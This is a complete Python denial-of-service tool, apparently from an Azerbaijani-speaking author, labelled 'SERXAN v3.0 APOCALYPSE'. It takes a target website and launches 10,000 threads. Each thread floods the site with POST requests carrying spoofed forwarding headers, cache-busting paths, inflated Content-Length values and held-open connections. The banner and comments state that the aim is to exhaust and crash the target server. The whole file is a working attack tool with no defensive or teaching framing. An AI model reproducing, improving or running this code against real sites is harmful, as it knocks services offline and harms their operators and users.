import socket, threading, random, os, time, ssl, sys

def serxan_banner():
    print("""\033[1;31m
    .      .            .      .      .      .
     .         .           .      .            .
     _______  _______  ______   __   _  _______  __    _ 
    |  _____||  _____||  __  \ |  | / /|  ___  ||  \  | |
    | |____  | |____  | |__|  ||  |/ / | |___| ||   \ | |
    |____  | |  ____| |      / |     \ |  ___  || |\  \| |
     ____| | | |_____ |  |\  \ |  |\  \| |   | || | \    |
    |_______||_______||__| \__\|__| \__\_|   |_||_|  \___|
    [+]----------------------------------------------[+]
    [|]  LAYİHƏ: SERXAN v3.0 [APOCALYPSE]            [|]
    [|]  STATUS: MAKSİMUM DAĞIDICI GÜC               [|]
    [|]  XÜSUSİYYƏT: SOCKET HIJACKING & BYPASS       [|]
    [+]----------------------------------------------[+]
    \033[0m""")

def get_deadly_payload(host):
    # Sunucunu kilitləyən ən ağır HTTP başlıqları
    ver = f"{random.randint(50, 110)}.0.{random.getrandbits(12)}"
    ips = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    
    # Sunucunun keşini (cache) keçmək üçün təsadüfi sorğular
    path = f"/?q={random.getrandbits(32)}&id={random.getrandbits(16)}"
    
    headers = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/{ver}",
        f"X-Forwarded-For: {ips}",
        f"X-Real-IP: {ips}",
        f"Content-Type: application/x-www-form-urlencoded",
        f"Content-Length: {random.randint(10000, 50000)}",
        f"Connection: Keep-Alive", # Sunucunu açıq qalmağa məcbur edir
        f"Accept-Encoding: gzip, deflate, br",
        f"Cache-Control: no-cache",
        "\r\n"
    ]
    return "\r\n".join(headers).encode()

def apocalypse_strike(ip, port, host):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1) # Paket gecikməsini ləğv et
            
            if port == 443:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)
            
            s.connect((ip, port))
            
            # Hər bağlantıda 200 ağır paket göndər
            for _ in range(200):
                s.sendall(get_deadly_payload(host))
            
            # Bağlantını dərhal bağlama (Sunucu resursu tükənsin)
            time.sleep(random.uniform(0.5, 1.5))
            s.close()
        except:
            pass

if __name__ == "__main__":
    os.system("clear")
    serxan_banner()
    
    if len(sys.argv) > 1:
        target = sys.argv[1].replace("http://", "").replace("https://", "").split("/")[0]
    else:
        target = input("\033[1;37mHədəf saytı daxil edin: \033[0m").replace("http://", "").replace("https://", "").split("/")[0]
    
    try:
        ip = socket.gethostbyname(target)
        test_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test_s.settimeout(2)
        port = 443 if test_s.connect_ex((ip, 443)) == 0 else 80
        test_s.close()
        
        print(f"\033[1;32m[*] Hədəf: {target} | IP: {ip} | Port: {port}\033[0m")
        print(f"\033[1;31m[*] CİHAZ %100 GÜCƏ ÇIXIR. 10,000 XƏTT BAŞLADILIR...\033[0m")
        
        # 10,000 Thread - Bu, telefon üçün son həddir
        for _ in range(10000):
            threading.Thread(target=apocalypse_strike, args=(ip, port, target), daemon=True).start()
            
        while True:
            print(f"\r\033[1;91m[☢️] APOCALYPSE AKTİVDİR: {target} SİSTEMİ ÇÖKDÜRÜLÜR... \033[0m", end="")
            time.sleep(1)
    except Exception as e:
        print(f"Xəta: {e}")
